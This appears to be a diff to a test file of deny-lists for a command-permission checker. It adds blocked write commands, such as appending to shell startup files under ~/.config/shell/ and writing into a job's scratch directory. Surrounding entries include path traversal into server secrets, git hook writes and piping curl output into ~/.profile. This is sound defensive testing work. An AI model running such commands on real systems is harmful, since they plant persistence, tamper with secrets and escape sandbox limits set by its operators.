@@ -1425,6 +1425,9 @@ WRITE_DENY = [
     "echo evil | tee -a ~/.zlogout",
     "echo evil > ~/.bash_login",
     "sed -i '$ a evil' ~/.bash_logout",
+    # the startup files source what `~/.config/shell/` holds
+    "echo evil >> ~/.config/shell/env.sh",
+    "sed -i '$ a evil' ~/.config/shell/common.sh",
     "curl -s http://x | tee ~/.profile",
     "tee secrets/secrets.yml",
     "echo x > secrets/secrets.yml",
@@ -1554,6 +1557,7 @@ SCRATCH_FIXTURE_DENY = [
     f"printf k > {HOME}/.claude/jobs/x/tmp/../../../../server/secrets.yml",
     "printf 'k\\n' > $CLAUDE_JOB_DIR/tmp/x/.bashrc",
     "printf 'k\\n' > $CLAUDE_JOB_DIR/tmp/x/.zshenv",
+    "printf 'k\\n' > $CLAUDE_JOB_DIR/tmp/x/.config/shell/env.sh",
     "printf 'k\\n' > $CLAUDE_JOB_DIR/tmp/.git/hooks/pre-push",
     "cp x $CLAUDE_JOB_DIR/tmp/.git/config",
     # a second write beside the fixture, another variable, or a reassigned job dir
